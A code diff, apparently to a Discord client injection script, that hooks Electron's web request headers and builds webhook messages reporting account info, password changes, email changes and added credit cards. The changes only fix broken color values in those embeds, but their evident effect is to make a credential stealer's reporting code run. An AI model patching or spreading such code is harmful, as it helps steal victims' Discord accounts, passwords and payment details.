@@ -197,7 +197,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
-                    "color": #000000,
+                    "color":2560,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -249,7 +249,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                 avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
                 embeds: [
                     {
-                        "color": #000000,
+                        "color":2560,
                         "fields": [
                             {
                                 "name": "**Password Changed**",
@@ -307,7 +307,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
-                    "color": #000000,
+                    "color": 2560,
                     "fields": [
                         {
                             "name": "**Email Changed**",
@@ -365,7 +365,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
-                    "color": #000000
+                    "color":2560,
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
